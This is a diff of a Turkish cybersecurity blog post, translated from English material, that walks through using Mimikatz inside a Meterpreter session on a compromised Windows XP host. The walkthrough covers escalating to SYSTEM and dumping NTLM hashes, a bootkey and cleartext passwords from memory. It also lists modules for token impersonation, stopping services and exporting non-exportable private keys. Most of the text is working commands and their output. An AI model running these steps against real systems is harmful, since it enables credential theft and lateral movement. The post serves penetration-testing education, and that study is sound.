@@ -5,7 +5,7 @@ date: 2017-06-16 09:00:06.000000000 +02:00
 type: post
 author: siberoloji
 img: metasploit.jpg
-published: false
+published: true
 status: publish
 categories:
 - Nasıl
@@ -13,48 +13,60 @@ categories:
 tags:
 - msfconsole
 - metasploit Framework
-- Metasploit Framework timestomp
-- msf meterpreter timestomp
+- Metasploit Framework mimikatz
+- msf meterpreter mimikatz
 
-excerpt: Herhangi bir sistemde pentest yapmak, o sistemle etkileşime girmeyi gerektirir. Gerçekleştirdiğiniz her işlemde, hedef sistemde izler bırakırsınız. Bu bıraktığınız izleri incelemek **forensics** araştırmacılarının dikkatini çeker. Dosyaların zaman damgaları bunlardan bir tanesidir. Bırakılan bu izleri temizlemek veya en azından karıştırmak için Meterpreter ```timestomp``` adı verilen bir komut sağlamaktadır.
+excerpt: Metasploit Framework, çok yönlü kullanım imkanları sağlamaktadır. Bu sebeple, harici kaynaklardan kodları da sistem içine dahil etmek mümkündür. Bu yazımızda, mimikatz uygulamasının Metasploit Framework içinde kullanımı ile ilgili örneklere bakacağız.
 ---
 
-The Metasploit Framework is such a versatile asset in every pentesters toolkit, it is no shock to see it being expanded on constantly. Due to the openness of the Framework, as new technologies and exploits surface they are very rapidly incorporated into the msf svn trunk or end users write their own modules and share them as they see fit.
+Metasploit Framework, çok yönlü kullanım imkanları sağlamaktadır. Bu sebeple, harici kaynaklardan kodları da sistem içine dahil etmek mümkündür. Bu yazımızda, mimikatz uygulamasının Metasploit Framework içinde kullanımı ile ilgili örneklere bakacağız.
 
-We will be talking about backdooring .exe files, karmetasploit, and targeting Mac OS X.
+# Mimikatz nedir?
 
-Mimikatz
-Mimikatz is a great post-exploitation tool written by Benjamin Delpy (gentilkiwi). After the initial exploitation phase, attackers may want to get a firmer foothold on the computer/network. Doing so often requires a set of complementary tools. Mimikatz is an attempt to bundle together some of the most useful tasks that attackers will want to perform.
+Mimikatz, esasında Benjamin Delpy tarafından yazılan bir post-exploitation programıdır. Hedef bilgisayardan bilgi toplama için kullanılır. Mimikatz, bilgi toplama için gerekli bir çok farklı komutu bünyesinde toplamıştır.
 
-Fortunately, Metasploit has decided to include Mimikatz as a meterpreter script to allow for easy access to its full set of features without needing to upload any files to the disk of the compromised host.
+# Mimikatz Yükleme
 
-Note: The version of Mimikatz in metasploit is v1.0, however Benjamin Delpy has already released v2.0 as a stand-alone package on his website. This is relevant as a lot of the syntax has changed with the upgrade to v2.0.
+Mimikatz, hedef sistemde bir Meterpreter oturumu açtıktan sonra çalıştırılabilir. Sisteme herhangi bir dosya yüklemeye gerek kalmadan hafıza üzerinde çalışır. Etkin olarak çalışabilmesi için SYSTEM seviyesinde oturum yetkilerine sahip olmamız gerekir.
 
-Loading Mimikatz
-
-After obtaining a meterpreter shell, we need to ensure that our session is running with SYSTEM level privileges for Mimikatz to function properly.
-
+```sh
 meterpreter > getuid
 Server username: WINXP-E95CE571A1\Administrator
+```
 
+Bu çıktıda, hedef sistemde SYSTEM seviyesinde olmadığımız görülmektedir. Öncelikle SYSTEM seviyesine geçmeye çalışalım.
+
+```sh
 meterpreter > getsystem
 ...got system (via technique 1).
 
 meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
-Mimikatz supports 32bit and 64bit Windows architectures. After upgrading our privileges to SYSTEM, we need to verify, with the sysinfo command, what the architecture of the compromised machine is. This will be relevant on 64bit machines as we may have compromised a 32bit process on a 64bit architecture. If this is the case, meterpreter will attempt to load a 32bit version of Mimikatz into memory, which will cause most features to be non-functional. This can be avoided by looking at the list of running processes and migrating to a 64bit process before loading Mimikatz.
+```
 
+Başarılı olduysanız yukarıdaki gibi SYSTEM seviyesine geçtiğinize dair çıktı alırsınız.
+
+Mimikatz, 32-bit ve 64-bit mimarilerde çalışmak üzere tasarlanmıştır. SYSTEM seviyesine geçtikten sonra hedef sistemin mimarisinin ne olduğuna ```sysinfo``` komutuyla bakmalıyız. Bazen, Meterpreter oturum 64-bit mimaride çalışan bir 32-bit mimari prosesinde oturum açmış olabilir. Bu durumda mimikatz'ın bazı özellikleri çalışmayacaktır. Meterpreter oturumu 32-bit bir proseste çalışıyorsa (Mimari aslında 64-bit olmasına rağmen), mimikatz, 32-bit için yazılımları kullanmaya çalışacaktır. Bunun önüne geçmenin yolu ```ps``` komutuyla çalışan proseslere bakmak ve ```migrate``` komutuyla başka bir prosese geçmektir.
+
+```sh
 meterpreter > sysinfo
 Computer        : WINXP-E95CE571A1
 OS              : Windows XP (Build 2600, Service Pack 3).
 Architecture    : x86
 System Language : en_US
 Meterpreter     : x86/win32
-Since this is a 32bit machine, we can proceed to load the Mimikatz module into memory.
+```
 
+Burada görülen çıktıda, hedef makinenin zaten 32-bit mimaride olduğunu görüyoruz. O zaman, 32-bit, 64-bit çakışması bulunmamaktadır. Artık ```mimikatz``` modülünü yükleyebiliriz.
+
+```sh
 meterpreter > load mimikatz
 Loading extension mimikatz...success.
+```
 
+Yükleme başarıyla tamamlandıktan sonra öncelikle yardım bilgisini görüntüleyelim.
+
+```sh
 meterpreter > help mimikatz
 
 Mimikatz Commands
@@ -69,12 +81,22 @@ Mimikatz Commands
     ssp               Attempt to retrieve ssp creds
     tspkg             Attempt to retrieve tspkg creds
     wdigest           Attempt to retrieve wdigest creds
-Metasploit provides us with some built-in commands that showcase Mimikatz’s most commonly-used feature, dumping hashes and clear text credentials straight from memory. However, the mimikatz_command option gives us full access to all the features in Mimikatz.
+```
 
+Mimikatz, temel olarak yukarıdaki komutları kullanmamızı sağlarsa da içlerinde en güçlüsü ```mimikatz_command``` seçeneğidir.
+
+Öncelikle mimikatz sürümünü kontrol edelim.
+
+```sh
 meterpreter > mimikatz_command -f version
 mimikatz 1.0 x86 (RC) (Nov  7 2013 08:21:02)
-Though slightly unorthodox, we can get a complete list of the available modules by trying to load a non-existent feature.
+```
 
+Mimikatz'ın sağladığı bir takım modüller bulunur. Bu modüllerin listesini görmek için sistemde bulunmayan bir modül ismi vermeniz yeterlidir. Bu durumda mimikatz size kullanılabilir modüllerin listesini verecektir. Komut kullanımında ```modüladı::``` kullanım formatına dikkat edin.
+
+Aşağıdaki örnekte, ```fu::``` modülü istenmiştir. Böyle bir modül olmadığından kullanılabilir tüm modülleri listelemiş olduk.
+
+```sh
 meterpreter > mimikatz_command -f fu::
 Module : 'fu' introuvable
 
@@ -98,8 +120,11 @@ Modules disponibles :
       divers    - Fonctions diverses n'ayant pas encore assez de corps pour avoir leurs propres module
     sekurlsa    - Dump des sessions courantes par providers LSASS
          efs    - Manipulations EFS
-To query the available options for these modules, we can use the following syntax.
+```
 
+Bu listede bulunan modüllerin kullanılabilir seçeneklerini listelemek için modül ismini vererek girilen komut aşağıdaki formatta kullanılmaktadır.
+
+```
 meterpreter > mimikatz_command -f divers::
 Module : 'divers' identifié, mais commande '' introuvable
 
@@ -108,12 +133,17 @@ Description du module : Fonctions diverses n'ayant pas encore assez de corps pou
    eventdrop    - [super experimental] Patch l'observateur d'événements pour ne plus rien enregistrer
   cancelator    - Patch le bouton annuler de Windows XP et 2003 en console pour déverrouiller une session
      secrets    - Affiche les secrets utilisateur
-Reading Hashes and Passwords from Memory
+```
 
-We can use both the built-in Metasploit commands as well as the native Mimikatz commands to extract hashes and clear-text credentials from the compromised machine.
+Gördüğünüz gibi ```drivers``` modülünün, ```noroutemon, eventdrop, cancelator, secrets``` seçenekleri bulunmaktadır.
 
-Built-In Metasploit:
+# RAM Hafızadan Hash ve Parola Okuma
 
+RAM hafızadan Hash değerlerini ve parolaları okumak için Metasploit Framework'ün sağladığı kendi komutlarını kullanabileceğimiz gibi ```mimikaz``` modüllerini de kullanabiliriz.
+
+## Metasploit Komutları ile Bilgi Elde etme
+
+```
 meterpreter > msv
 [+] Running as SYSTEM
 [*] Retrieving msv credentials
@@ -141,8 +171,11 @@ AuthID   Package    Domain           User              Password
 0;56683  NTLM                                          
 0;996    Negotiate  NT AUTHORITY     NETWORK SERVICE   
 0;78980  NTLM       WINXP-E95CE571A1  Administrator     SuperSecretPassword
-Native Mimikatz:
+```
 
+## Mimikatz Modülleri ile Bilgi Elde Etme
+
+```sh
 meterpreter > mimikatz_command -f samdump::hashes
 Ordinateur : winxp-e95ce571a1
 BootKey    : 553d8c1349162121e2a5d3d0f571db7f
@@ -169,20 +202,24 @@ NTLM : 771ee1fce7225b28f8aec4a88aea9b6a
 
 meterpreter > mimikatz_command -f sekurlsa::searchPasswords
 [0] { Administrator ; WINXP-E95CE571A1 ; SuperSecretPassword }
-Other Modules
+```
 
-The other Mimikatz modules contain a lot of useful features. A more complete feature list can be found on Benjamin Delpy’s blog – http://blog.gentilkiwi.com/. Below are several usage examples to get an understanding of the syntax employed.
+# Diğer Modüller
 
-The handle module can be used to list/kill processes and impersonate user tokens.
+Yukarıda örnek olarak gösterilen modüllerin haricinde başka modüllerde bulunur. Bunların tamamını [Mimikatz](http://blog.gentilkiwi.com/) web sayfasından inceleyebilirsiniz.
 
+## Kullanıcı Token Bilgileri
+
+```sh
 meterpreter > mimikatz_command -f handle::
 Module : 'handle' identifié, mais commande '' introuvable
 
 Description du module : Manipulation des handles
-        list    - Affiche les handles du système (pour le moment juste les processus et tokens)
- processStop    - Essaye de stopper un ou plusieurs processus en utilisant d'autres handles
-tokenImpersonate        - Essaye d'impersonaliser un token en utilisant d'autres handles
-     nullAcl    - Positionne une ACL null sur des Handles
+list              - Affiche les handles du système (pour le moment juste les processus et tokens)
+processStop       - Essaye de stopper un ou plusieurs processus en utilisant d'autres handles
+tokenImpersonate  - Essaye d'impersonaliser un token en utilisant d'autres handles
+nullAcl           - Positionne une ACL null sur des Handles
+
 
 meterpreter > mimikatz_command -f handle::list
 ...snip...
@@ -199,8 +236,13 @@ meterpreter > mimikatz_command -f handle::list
   760  lsass.exe                 ->  1360       Process 2056    TPAutoConnSvc.exe
   760  lsass.exe                 ->  1424       Token           WINXP-E95CE571A1\Administrator
 ...snip...
-The service module allows you to list, start, stop, and remove Windows services.
+```
 
+## Windows Servisleri İşlemleri
+
+Mimikatz, Windows servislerini başlatma, durdurma ve kaldırma imkanı da sağlamaktadır. Servis modülüne ve seçeneklerine bakalım.
+
+```sh
 meterpreter > mimikatz_command -f service::
 Module : 'service' identifié, mais commande '' introuvable
 
@@ -210,7 +252,10 @@ Description du module : Manipulation des services
         stop    - Arrête un service ou pilote
       remove    - Supprime un service ou pilote
     mimikatz    - Installe et/ou démarre le pilote mimikatz
+```
+Bu seçeneklerden, listeleme modülünü kullanalım.
 
+```sh
 meterpreter > mimikatz_command -f service::list
 ...snip...
         WIN32_SHARE_PROCESS     STOPPED RemoteRegistry  Remote Registry
@@ -226,8 +271,13 @@ meterpreter > mimikatz_command -f service::list
  1804   WIN32_OWN_PROCESS       RUNNING Secunia PSI Agent       Secunia PSI Agent
  3460   WIN32_OWN_PROCESS       RUNNING Secunia Update Agent    Secunia Update Agent
 ...snip...
-The crypto module allows you to list and export any certificates and their corresponding private keys that may be stored on the compromised machine. This is possible even if they are marked as non-exportable.
+```
 
+## Kripto Modülü
+
+Mimikatz'ın sağladığı kripto modülüne ve seçeneklerine bakalım.
+
+```sh
 meterpreter > mimikatz_command -f crypto::
 Module : 'crypto' identifié, mais commande '' introuvable
 
@@ -240,7 +290,11 @@ exportCertificates      - Exporte les certificats
   exportKeys    - Exporte les clés
     patchcng    - [experimental] Patch le gestionnaire de clés pour l'export de clés non exportable
    patchcapi    - [experimental] Patch la CryptoAPI courante pour l'export de clés non exportable
+```
 
+Bu seçeneklerden ```listProviders``` seçeneğini kullanalım.
+
+```
 meterpreter > mimikatz_command -f crypto::listProviders
 Providers CryptoAPI :
         Gemplus GemSAFE Card CSP v1.0
@@ -255,32 +309,6 @@ Providers CryptoAPI :
         Microsoft Enhanced RSA and AES Cryptographic Provider (Prototype)
         Microsoft RSA SChannel Cryptographic Provider
         Microsoft Strong Cryptographic Provider
-Never Lose at Minesweeper Again!
+```
 
-Mimikatz also includes a lot of novelty features. One of our favourites is a module that can read the location of mines in the classic Windows Minesweeper game, straight from memory!
-
-Minesweeper mimikatz.png
-
- 
-
-meterpreter > mimikatz_command -f winmine::infos
-Mines           : 99
-Dimension       : 16 lignes x 30 colonnes
-Champ           : 
-
-         . . . . . . * . * 1   1 * 1           1 * . . . . . . * . *
-         . . * . . . . . . 1   1 1 1       1 1 2 . * . * * . * * . .
-         . * . . . . . * . 1         1 1 1 1 * . . . * . . * . . . .
-         . . . . . * . * * 2 1     1 2 * . . . * * . . * . . . . * .
-         . . * . . * . . . * 1     1 * . * . . . . . . . * . * . . .
-         . * * . . . . . . . 2 1 1 1 . * . . . . * . . * . . . . . .
-         . . . . . . . . . . . * . . . . . * . . . . . * * . . . . .
-         . . . * . * . . . . . * . * . . . . * . . . . * . . . . . .
-         . . . . . * * . * . * . * . * * . * * * . . . . . . . . * .
-         * * . * . . . 3 1 2 1 2 1 . . * . . * . . * . . * . . . . .
-         . . . . * * * 1         1 . . * * . . . * . . . . . . * . *
-         . . * * * . 3 1     1 1 2 * 2 2 2 . * . . . . . . * . . . .
-         . . . . . * 1   1 1 2 * . 1 1   1 . . . . * . * * * . . . .
-         . . . . . . 1   1 * . . . 1     1 * . . . * . . . . . * . .
-         . . . . . . 1 1 2 . . . * 1     1 1 1 1 * * . * . . . . * .
-         . * . . . . . * . . . * . 1           1 . * . . . . . . . *
+Yukarıdaki örneklerden göreceğiniz gibi, Mimikatz'a ait modüller ve bu modüllerin seçenekleri bulunuyor. Çok geniş ihtimaller dahilinde kullanabileceğiniz komutları tek tek deneyerek tecrübe kazanmanızı tavsiye ediyorum.
